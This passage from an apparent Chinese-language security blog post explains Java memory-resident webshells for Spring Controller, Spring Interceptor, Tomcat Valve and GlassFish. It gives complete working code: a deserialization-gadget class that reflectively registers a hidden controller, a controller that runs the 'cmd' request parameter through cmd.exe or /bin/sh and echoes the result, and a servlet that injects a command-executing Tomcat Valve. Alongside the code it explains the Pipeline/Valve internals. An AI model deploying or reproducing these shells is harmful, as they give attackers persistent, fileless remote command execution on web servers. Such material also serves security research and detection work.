<p><strong>注:</strong>  <code>@RestController</code>注解缺失会导致500错误、无回显</p>
<h4 id="3-controller的缺点"><a href="#3-controller的缺点" class="headerlink" title="3. controller的缺点"></a>3. controller的缺点</h4><p>在对于存在相关的拦截器的时候，controller内存马就无法进行利用，原因就在于拦截器的调用顺序在controller之前，所以controller不能作为通用的内存马来进行使用。</p>
<h3 id="Spring-Controller-内存马代码"><a href="#Spring-Controller-内存马代码" class="headerlink" title="Spring Controller 内存马代码"></a>Spring Controller 内存马代码</h3><p><a class="link"   href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#%E6%B3%A8%E5%86%8Ccontroller" >Spring 内存马实现 | MYZXCG <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>（一下内存马配合可以加载字节码的 gadget 使用，常见的有 CB1 , CC2 , CC11 , fastjson_Templates 链 ）</p>
<p><strong>KoishiEvilController</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro.vuln.Controller.koishi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiEvilController</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.example.spring.InjectControl&quot;</span>;</span><br><span class="line">            <span class="comment">//加载com.example.spring.InjectControl类的字节码</span></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             *  加载我们的恶意 Controller 字节码</span></span><br><span class="line"><span class="comment">            * */</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(InjectControl.class.getName()).toBytecode();</span><br><span class="line">            java.lang.<span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">m0</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            m0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            m0.invoke(classLoader, className, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 获取上下文</span></span><br><span class="line"><span class="comment">            * */</span></span><br><span class="line">            <span class="comment">// first</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// second</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// third</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// fourth 从当前request属性中获取org.springframework.web.servlet.DispatcherServlet.CONTEXT, 其中对应的值为 AnnotationConfigServletWebServerApplicationContext</span></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line">            <span class="comment">//WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// fifth</span></span><br><span class="line"><span class="comment">//            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * registerMapping 在 spring 4.0 及以后，可以使用 registerMapping 直接注册 requestMapping ，这是最直接的一种方式 ( 我2.6.6 也能注入进行就是好像会造成页面崩溃，但是不影响命令执行 )</span></span><br><span class="line"><span class="comment">             * */</span></span><br><span class="line">            <span class="comment">//从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="comment">//通过反射获得自定义controller中唯一的Method对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Class.forName(className).getDeclaredMethods())[<span class="number">0</span>];</span><br><span class="line">            <span class="comment">//定义访问controller的URL地址</span></span><br><span class="line">            <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/hahahaLaLaLa&quot;</span>);</span><br><span class="line">            <span class="comment">//定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class="line">            <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">            <span class="comment">//在内存中动态注册 controller</span></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            r.registerMapping(info, Class.forName(className).newInstance(), method);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>InjectControl</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro.vuln.Controller.koishi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectControl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectControl</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这个类也可以学胡师傅那样，写个 until 专门来存字节码</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/koishi&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="string">&quot;\\\\A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next() : o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>使用 gadget 加载 KoishiEvilController 打到 &#x2F;poc 端口即可</p>
<h2 id="七、Spring-Interceptor-内存马"><a href="#七、Spring-Interceptor-内存马" class="headerlink" title="七、Spring Interceptor 内存马"></a>七、Spring Interceptor 内存马</h2><p>同样推荐参考，拦截器处理原理不再做过多 “誊抄” ，这里只写下代码基本构成</p>
<p><a class="link"   href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#%E6%B3%A8%E5%86%8Ccontroller" >Spring 内存马实现 | MYZXCG <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>定义拦截器必须实现<code>HandlerInterceptor</code>接口，<code>HandlerInterceptor</code>接口中有三个方法：</p>
<ol>
<li>preHandle方法是controller方法执行前拦截的方法<ul>
<li>可以使用request或者response跳转到指定的页面</li>
<li>return true放行，执行下一个拦截器，如果没有拦截器，执行controller中的方法。</li>
<li>return false不放行，不会执行controller中的方法。</li>
</ul>
</li>
<li>postHandle是controller方法执行后执行的方法，在JSP视图执行前。<ul>
<li>可以使用request或者response跳转到指定的页面</li>
<li>如果指定了跳转的页面，那么controller方法跳转的页面将不会显示。</li>
</ul>
</li>
<li>afterCompletion方法是在JSP执行后执行<ul>
<li>request或者response不能再跳转页面了</li>
</ul>
</li>
</ol>
</blockquote>
<h3 id="动态注入Interceptor"><a href="#动态注入Interceptor" class="headerlink" title="动态注入Interceptor"></a>动态注入Interceptor</h3><p>通过上面分析发现，如果把自定义的Interceptor类加入到<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping </code>类的 <code>adaptedInterceptors</code> 属性中即可注册一个拦截器。这个挺好用，在每个页面都会触发，nice中的nice。</p>
<p>内存马代码见我给的项目吧，这里放个效果图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\image-20221111205039773.png"
                      alt="image-20221111205039773"
                ></p>
<p>看这 <code>uri</code> 再怎么离谱、就算不存在都能触发，在每个页面都能触发，可以说是肥肠（非常）好用了，挺有意思</p>
<h2 id="八、Tomcat-Valve-内存马"><a href="#八、Tomcat-Valve-内存马" class="headerlink" title="八、Tomcat Valve 内存马"></a>八、Tomcat Valve 内存马</h2><h3 id="概念提要"><a href="#概念提要" class="headerlink" title="概念提要"></a>概念提要</h3><p>Tomcat 在处理一个请求调用逻辑时，是如何处理和传递 Request 和 Respone 对象的呢？为了整体架构的每个组件的可伸缩性和可扩展性，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。</p>
<p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623645442719.jpg"
                      alt="img"
                ></p>
<p>上图的 basic 就是在前文中提到的最基础的 Valve，这个 basic 所属的类是 <code>StandardEngineValve</code></p>
<p>Tomcat 每个层级的容器（Engine、Host、Context、Wrapper），都有基础的 Valve 实现（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），他们同时维护了一个 Pipeline 实例（StandardPipeline），也就是说，我们可以在任何层级的容器上针对请求处理进行扩展。这四个 Valve 的基础实现都继承了 ValveBase。这个类帮我们实现了生命接口及MBean 接口，使我们只需专注阀门的逻辑处理即可。</p>
<p>在同一个Pipeline上可以有多个Valve,每个Valve都可以做一些操作，无论是Pipeline还是Valve操作的都是Request和Response。而在容器之间Pipeline和Valve则起到了桥梁的作用。</p>
<p>实在不好理解，可以将其类比于Filter 和 FilterChain 的关系</p>
<p><a class="link"   href="https://www.cnblogs.com/coldridgeValley/p/5816414.html" >Tomcat中容器的pipeline机制 - coldridgeValley - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line">    Valve <span class="title function_">getNext</span><span class="params">()</span>; <span class="comment">//获取下一个阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve var1)</span>; <span class="comment">//设置下一个阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>; <span class="comment">//后台执行逻辑</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request var1, Response var2)</span> <span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>; <span class="comment">//是否异步执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>先看<code>Valve</code>接口的方法定义，方法不是很多，这里只介绍<code>setNext()</code>,<code>getNext()</code>。在上面我们也看到了一个<code>Pipeline</code>上面可以有很多<code>Valve</code>，这些<code>Valve</code>存放的方式并非统一存放在<code>Pipeline</code>中，而是像一个链表一个接着一个。当你获取到一个<code>Valve</code>实例的时候，调用<code>getNext()</code>方法即可获取在这个<code>Pipeline</code>上的下个<code>Valve</code>实例。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Pipeline</span> <span class="keyword">extends</span> <span class="title class_">Contained</span> &#123;</span><br><span class="line">    Valve <span class="title function_">getBasic</span><span class="params">()</span>; <span class="comment">//获取基础阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setBasic</span><span class="params">(Valve var1)</span>; <span class="comment">//设置基础阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve var1)</span>; <span class="comment">//添加阀门</span></span><br><span class="line"></span><br><span class="line">    Valve[] getValves(); <span class="comment">//获取阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">removeValve</span><span class="params">(Valve var1)</span>; <span class="comment">//移除阀门</span></span><br><span class="line"></span><br><span class="line">    Valve <span class="title function_">getFirst</span><span class="params">()</span>; <span class="comment">//获取首个阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>; <span class="comment">//是否支持异步</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">findNonAsyncValves</span><span class="params">(Set&lt;String&gt; var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看出<code>Pipeline</code>中很多的方法都是操作<code>Valve</code>的，包括获取，设置，移除<code>Valve</code>,<code>getFirst()</code>返回的是<code>Pipeline</code>上的第一个<code>Valve</code>,而<code>getBasic()</code>,<code>setBasic()</code>则是获取&#x2F;设置基础阀,我们都知道在<code>Pipeline</code>中，每个<code>pipeline</code>至少都有一个阀门，叫做基础阀，而<code>getBasic()</code>,<code>setBasic()</code>则是操作基础阀的。</p>
<p><strong>Tomcat 中 Pipeline 仅有一个实现 StandardPipeline，存放在 ContainerBase 的 pipeline 属性中，并且 ContainerBase 提供 <code>addValve</code> 方法调用 StandardPipeline 的 addValve 方法添加。</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Validate that we can add this Valve</span></span><br><span class="line">	<span class="comment">// 验证Valve 关联Container</span></span><br><span class="line">    <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Contained)</span><br><span class="line">        ((Contained) valve).setContainer(<span class="built_in">this</span>.container);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start the new component if necessary</span></span><br><span class="line">	<span class="comment">// 验证组件状态，如果对的话 启动需要添加的Valve，调用start方法。</span></span><br><span class="line">    <span class="keyword">if</span> (getState().isAvailable()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((Lifecycle) valve).start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;StandardPipeline.addValve: start: &quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//如果 first变量为空，将valve赋值给first变量，并且设置 valve的下一个阀门为基础阀</span></span><br><span class="line">	<span class="comment">//之所以这样是因为，如果first为空说明这个容器只有一个基础阀，所以此次添加的阀门肯定是第一个非基础阀阀门</span></span><br><span class="line">    <span class="comment">// Add this Valve to the set associated with this Pipeline</span></span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">null</span>) &#123;</span><br><span class="line">        first = valve;</span><br><span class="line">        valve.setNext(basic);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//否则 遍历阀门链表，将要被添加的阀门设置在基础阀之前。</span></span><br><span class="line">        <span class="type">Valve</span> <span class="variable">current</span> <span class="operator">=</span> first;</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (current.getNext() == basic) &#123;</span><br><span class="line">                current.setNext(valve);</span><br><span class="line">                valve.setNext(basic);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            current = current.getNext();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//container触发添加阀门事件</span></span><br><span class="line">    container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>Tomcat 中四个层级的容器都继承了 ContainerBase ，所以在哪个层级的容器的标准实现上添加自定义的 Valve 均可。</p>
<p>添加后，将会在 <code>org.apache.catalina.connector.CoyoteAdapter</code> 的 <code>service</code> 方法中调用 Valve 的 <code>invoke</code> 方法。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623648233517.png"
                      alt="img"
                ></p>
<p>只要自己写一个 Valve 的实现类，为了方便也可以直接使用 ValveBase 实现类。里面的 <code>invoke</code> 方法加入我们的恶意代码，由于可以拿到 Request 和 Response 方法，所以也可以做一些参数上的处理或者回显。然后使用 StandardContext 中的 pipeline 属性的 addValve 方法进行注册。</p>
<h3 id="valve内存马编写路程"><a href="#valve内存马编写路程" class="headerlink" title="valve内存马编写路程"></a>valve内存马编写路程</h3><p><a class="link"   href="https://drun1baby.github.io/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#toc-heading-3" >Java内存马系列-06-Tomcat 之 Valve 型内存马 | 芜风 (drun1baby.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们无法直接获取到 <code>StandardPipeline</code> ，需要先获取 <code>StandardContext</code>才能拿到</p>
<p>所以这里我们可以得到的攻击思路如下：</p>
<ul>
<li><p>先获取 <code>StandardContext</code></p>
</li>
<li><p>编写恶意 Valve</p>
</li>
<li><p>通过 <code>StandardContext.getPipeline().addValve()</code> 添加恶意 Valve</p>
</li>
<li><p>Valve 是应该放到 Servlet 里面，因为在 Servlet 内存马中的 <code>HTTP11Processor</code> 的加载 HTTP 请求当中，是出现了 Pipeline 的 basic 的。所以我们通过 Servlet 来加载。</p>
</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Valve;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/testk&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiValve</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">            standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">ValveShell</span>());</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;Evil Valve inject success!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ValveShell</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdParamName</span> <span class="operator">=</span><span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(cmdParamName);</span><br><span class="line">                <span class="keyword">if</span>(cmd!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    java.io.<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                    response.getWriter().write(<span class="string">&quot;smail evil valve isComing!!!\n&quot;</span>);</span><br><span class="line">                    writer.write(output);</span><br><span class="line">                    writer.flush();</span><br><span class="line">                    writer.close();</span><br><span class="line">                    <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="九、GlassFish-Grizzly-Filter-内存马"><a href="#九、GlassFish-Grizzly-Filter-内存马" class="headerlink" title="九、GlassFish Grizzly Filter 内存马"></a>九、GlassFish Grizzly Filter 内存马</h2><p>（这个组件的内存马，网上资料相当少啊。。）</p>
<p>需要去下一个glassfish来做容器，我一直以为是maven添加依赖。。。找了我好几个小时。。我装的5.0版本的</p>
